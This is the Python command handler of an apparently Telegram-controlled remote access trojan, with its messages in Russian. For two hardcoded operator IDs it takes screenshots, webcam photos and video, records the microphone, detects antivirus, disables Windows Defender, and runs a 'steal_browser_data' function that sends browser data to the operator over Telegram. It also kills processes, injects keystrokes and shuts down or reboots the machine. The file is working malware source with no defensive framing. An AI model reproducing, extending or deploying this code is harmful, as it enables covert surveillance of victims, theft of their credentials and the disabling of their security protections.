import os
import time
import asyncio
import platform
from telegram import KeyboardButton, ReplyKeyboardMarkup
async def take_screenshot(user_id):
    if not modules.get('screenshot'):
        print("❌ Модуль screenshot не загружен")
        await utils.send_message(user_id, "❌ Модуль screenshot не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, "⌛ Делаю скриншот...")
        filename = modules['screenshot'].take_screenshot()
        if not filename:
            print("❌ Не удалось сделать скриншот")
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "❌ Не удалось сделать скриншот")
            return
            
        new_filename = utils.generate_temp_filename("png")
        os.rename(filename, new_filename)
        
        if await utils.send_screenshot(user_id, new_filename, message_id):
            print("✅ Скриншот отправлен")
        else:
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "❌ Не удалось отправить скриншот")
    except Exception as e:
        print(f"❌ Ошибка создания скриншота: {e}")
        await utils.send_message(user_id, f"❌ Ошибка скриншота: {e}")

async def take_webcam_photo(user_id):
    if not modules.get('webcam'):
        print("❌ Модуль webcam не загружен")
        await utils.send_message(user_id, "❌ Модуль webcam не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, "⌛ Делаю фото с веб-камеры...")
        filename = modules['webcam'].capture_webcam_photo()
        if not filename:
            print("❌ Веб-камера не найдена или не работает")
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "❌ Веб-камера не найдена или не работает")
            return
            
        new_filename = utils.generate_temp_filename("jpg")
        os.rename(filename, new_filename)
        
        if await utils.send_screenshot(user_id, new_filename, message_id):
            print("✅ Фото с веб-камеры отправлено")
        else:
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "❌ Не удалось отправить фото с веб-камеры")
    except Exception as e:
        print(f"❌ Ошибка веб-камеры: {e}")
        await utils.send_message(user_id, f"❌ Ошибка веб-камеры: {e}")

async def record_video(user_id, seconds):
    if not modules.get('video'):
        print("❌ Модуль video не загружен")
        await utils.send_message(user_id, "❌ Модуль video не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, f"⌛ Записываю видео ({seconds} сек)...")
        filename = modules['video'].record_video(seconds)
        if not filename:
            print("❌ Не удалось записать видео")
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "❌ Не удалось записать видео")
            return
            
        new_filename = utils.generate_temp_filename("mp4")
        os.rename(filename, new_filename)
        
        if await utils.send_video(user_id, new_filename, message_id):
            print("✅ Видео отправлено")
        else:
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "❌ Не удалось отправить видео")
    except Exception as e:
        print(f"❌ Ошибка записи видео: {e}")
        await utils.send_message(user_id, f"❌ Ошибка записи видео: {e}")

async def record_webcam_video(user_id, seconds):
    if not modules.get('webcam'):
        print("❌ Модуль webcam не загружен")
        await utils.send_message(user_id, "❌ Модуль webcam не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, f"⌛ Записываю видео с веб-камеры ({seconds} сек)...")
        filename = modules['webcam'].record_webcam_video(seconds)
        if not filename:
            print("❌ Не удалось записать видео с веб-камеры")
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "❌ Не удалось записать видео с веб-камеры")
            return
            
        new_filename = utils.generate_temp_filename("mp4")
        os.rename(filename, new_filename)
        
        if await utils.send_video(user_id, new_filename, message_id):
            print("✅ Видео с веб-камеры отправлено")
        else:
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "❌ Не удалось отправить видео с веб-камеры")
    except Exception as e:
        print(f"❌ Ошибка записи видео с веб-камеры: {e}")
        await utils.send_message(user_id, f"❌ Ошибка записи видео: {e}")

async def record_audio(user_id, seconds):
    if not modules.get('microphone'):
        print("❌ Модуль microphone не загружен")
        await utils.send_message(user_id, "❌ Модуль microphone не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, f"⌛ Записываю аудио ({seconds} сек)...")
        filename = modules['microphone'].record_audio(seconds)
        if not filename:
            print("❌ Микрофон не найден или не работает")
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "❌ Микрофон не найден или не работает")
            return
            
        new_filename = utils.generate_temp_filename("ogg")
        os.rename(filename, new_filename)
        
        if await utils.send_voice(user_id, new_filename, message_id):
            print("✅ Аудиозапись отправлена")
        else:
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "❌ Не удалось отправить аудиозапись")
    except Exception as e:
        print(f"❌ Ошибка записи аудио: {e}")
        await utils.send_message(user_id, f"❌ Ошибка записи аудио: {e}")

async def display_message(user_id, title, text, style="info"):
    if not modules.get('messagebox'):
        print("❌ Модуль messagebox не загружен")
        await utils.send_message(user_id, "❌ Модуль messagebox не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, f"⌛ Показываю сообщение: {title}")
        start_time = time.time()
        result = modules['messagebox'].display_message(title, text, style)
        execution_time = round(time.time() - start_time, 2)
        await utils.delete_message(user_id, message_id)
        if result:
            await utils.send_message(user_id, f"✅ Сообщение '{title}' показано за {execution_time} сек")
        else:
            await utils.send_message(user_id, "❌ Не удалось показать сообщение")
    except Exception as e:
        print(f"❌ Ошибка показа сообщения: {e}")
        await utils.send_message(user_id, f"❌ Ошибка показа сообщения: {e}")

async def check_antivirus(user_id):
    if platform.system() != "Windows":
        print("❌ Антивирус доступен только на Windows")
        await utils.send_message(user_id, "❌ Антивирус доступен только на Windows")
        return
    if not modules.get('antivirus'):
        print("❌ Модуль antivirus не загружен")
        await utils.send_message(user_id, "❌ Модуль antivirus не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, "⌛ Проверяю антивирусы...")
        result = modules['antivirus'].detect_antivirus()
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, result if result else "🛡 Антивирусы не найдены")
    except Exception as e:
        print(f"❌ Ошибка проверки антивируса: {e}")
        await utils.send_message(user_id, f"❌ Ошибка проверки антивируса: {e}")

async def disable_defender(user_id):
    if platform.system() != "Windows":
        print("❌ Отключение Defender доступно только на Windows")
        await utils.send_message(user_id, "❌ Отключение Defender доступно только на Windows")
        return
    if not modules.get('defender'):
        print("❌ Модуль defender не загружен")
        await utils.send_message(user_id, "❌ Модуль defender не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, "⌛ Отключаю Windows Defender...")
        result = modules['defender'].disable_defender()
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, result)
    except Exception as e:
        print(f"❌ Ошибка отключения Defender: {e}")
        await utils.send_message(user_id, f"❌ Ошибка отключения Defender: {e}")

async def steal_browser_data(user_id):
    if not modules.get('browser'):
        print("❌ Модуль browser не загружен")
        await utils.send_message(user_id, "❌ Модуль browser не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, "⌛ Собираю данные из браузеров...")
        result = modules['browser'].get_browser_data()
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, result)
    except Exception as e:
        print(f"❌ Ошибка сбора данных браузеров: {e}")
        await utils.send_message(user_id, f"❌ Ошибка сбора данных браузеров: {e}")

async def jiggle_mouse(user_id):
    if not modules.get('mouse'):
        print("❌ Модуль mouse не загружен")
        await utils.send_message(user_id, "❌ Модуль mouse не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, "⌛ Дёргаю мышку...")
        result = modules['mouse'].jiggle()
        await utils.delete_message(user_id, message_id)
        if result:
            await utils.send_message(user_id, "🖱 Мышь дернута")
        else:
            await utils.send_message(user_id, "❌ Функция доступна только на Windows")
    except Exception as e:
        print(f"❌ Ошибка движения мышки: {e}")
        await utils.send_message(user_id, f"❌ Ошибка движения мышки: {e}")

async def minimize_window(user_id):
    if not modules.get('minimize'):
        print("❌ Модуль minimize не загружен")
        await utils.send_message(user_id, "❌ Модуль minimize не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, "⌛ Сворачиваю активное окно...")
        result = modules['minimize'].minimize_active_window()
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, "✅ Окно свёрнуто" if result else "❌ Не удалось свернуть окно")
    except Exception as e:
        print(f"❌ Ошибка сворачивания окна: {e}")
        await utils.send_message(user_id, f"❌ Ошибка сворачивания окна: {e}")

async def minimize_all_windows(user_id):
    if not modules.get('minimize'):
        print("❌ Модуль minimize не загружен")
        await utils.send_message(user_id, "❌ Модуль minimize не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, "⌛ Сворачиваю все окна...")
        result = modules['minimize'].minimize_all_windows()
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, "✅ Все окна свёрнуты" if result else "❌ Не удалось свернуть окна")
    except Exception as e:
        print(f"❌ Ошибка сворачивания всех окон: {e}")
        await utils.send_message(user_id, f"❌ Ошибка сворачивания всех окон: {e}")

async def set_volume(user_id, mute=False):
    if platform.system() != "Windows":
        print("❌ Управление звуком доступно только на Windows")
        await utils.send_message(user_id, "❌ Управление звуком доступно только на Windows")
        return
    if not modules.get('sound'):
        print("❌ Модуль sound не загружен")
        await utils.send_message(user_id, "❌ Модуль sound не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, "⌛ Выключаю звук..." if mute else "⌛ Включаю звук...")
        result = modules['sound'].mute() if mute else modules['sound'].unmute()
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, "✅ Звук изменён" if result else "❌ Не удалось изменить звук")
    except Exception as e:
        print(f"❌ Ошибка управления звуком: {e}")
        await utils.send_message(user_id, f"❌ Ошибка управления звуком: {e}")

async def shutdown_pc(user_id):
    if not modules.get('power'):
        print("❌ Модуль power не загружен")
        await utils.send_message(user_id, "❌ Модуль power не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, "⌛ Выключаю компьютер...")
        result = modules['power'].shutdown()
        await utils.delete_message(user_id, message_id)
        if result:
            await utils.send_message(user_id, "🔌 Компьютер выключается...")
        else:
            await utils.send_message(user_id, "❌ Не удалось выключить компьютер")
    except Exception as e:
        print(f"❌ Ошибка выключения: {e}")
        await utils.send_message(user_id, f"❌ Ошибка выключения: {e}")

async def reboot_pc(user_id):
    if not modules.get('power'):
        print("❌ Модуль power не загружен")
        await utils.send_message(user_id, "❌ Модуль power не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, "⌛ Перезагружаю компьютер...")
        result = modules['power'].reboot()
        await utils.delete_message(user_id, message_id)
        if result:
            await utils.send_message(user_id, "🔄 Компьютер перезагружается...")
        else:
            await utils.send_message(user_id, "❌ Не удалось перезагрузить компьютер")
    except Exception as e:
        print(f"❌ Ошибка перезагрузки: {e}")
        await utils.send_message(user_id, f"❌ Ошибка перезагрузки: {e}")

async def terminate_active_process(user_id):
    if not modules.get('terminate'):
        print("❌ Модуль terminate не загружен")
        await utils.send_message(user_id, "❌ Модуль terminate не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, "⌛ Завершаю активный процесс...")
        success, execution_time, active_window = modules['terminate'].terminate_active_process()
        await utils.delete_message(user_id, message_id)
        if success:
            await utils.send_message(user_id, f"✅ Процесс окна '{active_window}' завершен за {execution_time} сек")
        else:
            await utils.send_message(user_id, "❌ Не удалось завершить процесс")
    except Exception as e:
        print(f"❌ Ошибка завершения активного процесса: {e}")
        await utils.send_message(user_id, f"❌ Ошибка завершения процесса: {e}")

async def terminate_process_by_name(user_id, process_name):
    if not modules.get('terminate_process'):
        print("❌ Модуль terminate_process не загружен")
        await utils.send_message(user_id, "❌ Модуль terminate_process не загружен")
        return
    try:
        message_id = await utils.send_message(user_id, f"⌛ Завершаю процесс {process_name}...")
        result = modules['terminate_process'].terminate_process_by_name(process_name)
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, result)
    except Exception as e:
        print(f"❌ Ошибка завершения процесса {process_name}: {e}")
        await utils.send_message(user_id, f"❌ Ошибка завершения процесса {process_name}: {e}")

async def press_key_combination(user_id, keys):
    if not modules.get('keyboard') and not modules.get('key_combination'):
        print("❌ Модули keyboard и key_combination не загружены")
        await utils.send_message(user_id, "❌ Модули keyboard и key_combination не загружены")
        return
    try:
        valid_keys = ['alt', 'ctrl', 'shift', 'win', 'tab', 'enter', 'space'] + [f'f{i}' for i in range(1, 13)] + list('abcdefghijklmnopqrstuvwxyz1234567890')
        keys_parts = [k.strip().lower() for k in keys.split('+')]
        for k in keys_parts:
            if k not in valid_keys:
                await utils.send_message(user_id, f"❌ Неверная клавиша: {k}. Используйте формат 'alt + f4' или 'ctrl + c'")
                return
                
        message_id = await utils.send_message(user_id, f"⌛ Нажимаю комбинацию {keys}...")
        if modules.get('keyboard'):
            result = modules['keyboard'].press_combination(keys)
        else:
            result = modules['key_combination'].press_key_combination(keys)
            
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, result)
    except Exception as e:
        print(f"❌ Ошибка нажатия комбинации клавиш {keys}: {e}")
        await utils.send_message(user_id, f"❌ Ошибка нажатия комбинации: {e}")

async def handle_text(update, context):
    user_id = update.message.from_user.id
    if user_id not in ALLOWED_USER_IDS:
        return
    text = update.message.text.strip()
    
    if text == "📸 Скриншот":
        await take_screenshot(user_id)
    elif text == "📸 Фото с веб-камеры":
        await take_webcam_photo(user_id)
    elif text == "🎥 Сделать видео":
        awaiting_duration[user_id] = "video"
        await utils.send_message(user_id, "🎥 Введите длительность видео (5-30 сек):")
    elif text == "🎥 Видео с веб-камеры":
        awaiting_duration[user_id] = "webcam_video"
        await utils.send_message(user_id, "🎥 Введите длительность видео (5-30 сек):")
    elif text == "🎙 Запись звука":
        awaiting_duration[user_id] = "audio"
        await utils.send_message(user_id, "🎙 Введите длительность записи (5-30 сек):")
    elif text == "💬 Написать сообщение":
        await utils.send_message(user_id, "💬 Выберите тип сообщения:", reply_markup=utils.create_message_type_menu())
    elif text == "📢 Вызвать сообщение":
        awaiting_messagebox[user_id] = "info"
        await utils.send_message(user_id, "💬 Введите заголовок сообщения:")
    elif text == "⚠️ Вызвать предупреждение":
        awaiting_messagebox[user_id] = "warning"
        await utils.send_message(user_id, "💬 Введите заголовок предупреждения:")
    elif text == "❌ Вызвать ошибку":
        awaiting_messagebox[user_id] = "error"
        await utils.send_message(user_id, "💬 Введите заголовок ошибки:")
    elif text == "🛡 Антивирус":
        await check_antivirus(user_id)
    elif text == "🛡 Отключить Defender":
        await disable_defender(user_id)
    elif text == "🌐 Браузеры":
        await steal_browser_data(user_id)
    elif text == "📊 Процессы":
        current_process_page[user_id] = 0
        keyboard, message = await utils.create_processes_menu(user_id, current_process_page[user_id])
        await utils.send_message(user_id, message, reply_markup=keyboard)
    elif text == "💀 Завершить процесс":
        await terminate_active_process(user_id)
    elif text == "💀 Завершить определённый процесс":
        awaiting_process_name[user_id] = True
        await utils.send_message(user_id, "💀 Введите название процесса (например, notepad):")
    elif text == "⌨️ Нажать комбинацию клавиш":
        awaiting_key_combination[user_id] = True
        await utils.send_message(user_id, "⌨️ Введите комбинацию клавиш (например, alt + f4):")
    elif text == "⬇️ Свернуть окно":
        await minimize_window(user_id)
    elif text == "📥 Свернуть все":
        await minimize_all_windows(user_id)
    elif text == "🖱 Дергать мышкой":
        await jiggle_mouse(user_id)
    elif text == "🔊 Включить звук":
        await set_volume(user_id, mute=False)
    elif text == "🔇 Выключить звук":
        await set_volume(user_id, mute=True)
    elif text == "🔌 Выключить ПК":
        await shutdown_pc(user_id)
    elif text == "🔄 Перезагрузить ПК":
        await reboot_pc(user_id)
    elif text == "🔙 Назад":
        await utils.send_message(user_id, "📱 Главное меню", reply_markup=utils.create_device_menu(DEVICE_NAME))
    elif text == "⬅️ Назад":
        current_process_page[user_id] = max(0, current_process_page[user_id] - 1)
        keyboard, message = await utils.create_processes_menu(user_id, current_process_page[user_id])
        await utils.send_message(user_id, message, reply_markup=keyboard)
    elif text == "➡️ Вперед":
        current_process_page[user_id] += 1
        keyboard, message = await utils.create_processes_menu(user_id, current_process_page[user_id])
        await utils.send_message(user_id, message, reply_markup=keyboard)
    elif user_id in awaiting_duration:
        if text.isdigit():
            seconds = int(text)
            if 5 <= seconds <= 30:
                if awaiting_duration[user_id] == "video":
                    await record_video(user_id, seconds)
                elif awaiting_duration[user_id] == "webcam_video":
                    await record_webcam_video(user_id, seconds)
                elif awaiting_duration[user_id] == "audio":
                    await record_audio(user_id, seconds)
                del awaiting_duration[user_id]
            else:
                await utils.send_message(user_id, "❌ Введите число от 5 до 30!")
        else:
            await utils.send_message(user_id, "❌ Введите число!")
    elif user_id in awaiting_messagebox:
        if isinstance(awaiting_messagebox[user_id], str):
            awaiting_messagebox[user_id] = (awaiting_messagebox[user_id], text)
            await utils.send_message(user_id, f"💬 Введите текст сообщения для заголовка '{text}':")
        elif isinstance(awaiting_messagebox[user_id], tuple):
            style, title = awaiting_messagebox[user_id]
            content = text
            await display_message(user_id, title, content, style)
            del awaiting_messagebox[user_id]
    elif user_id in awaiting_process_name:
        process_name = text
        await terminate_process_by_name(user_id, process_name)
        del awaiting_process_name[user_id]
    elif user_id in awaiting_key_combination:
        keys = text
        await press_key_combination(user_id, keys)
        del awaiting_key_combination[user_id]
    else:
        await utils.send_message(user_id, "❌ Неизвестная команда")

def initialize(modules_dict, states, device_name):
    global modules, current_process_page, awaiting_duration, awaiting_messagebox
    global awaiting_process_name, awaiting_key_combination, DEVICE_NAME, ALLOWED_USER_IDS
    
    modules = modules_dict
    current_process_page = states['current_process_page']
    awaiting_duration = states['awaiting_duration']
    awaiting_messagebox = states['awaiting_messagebox']
    awaiting_process_name = states['awaiting_process_name']
    awaiting_key_combination = states['awaiting_key_combination']
    DEVICE_NAME = device_name
    ALLOWED_USER_IDS = [6710064443, 2127575985]
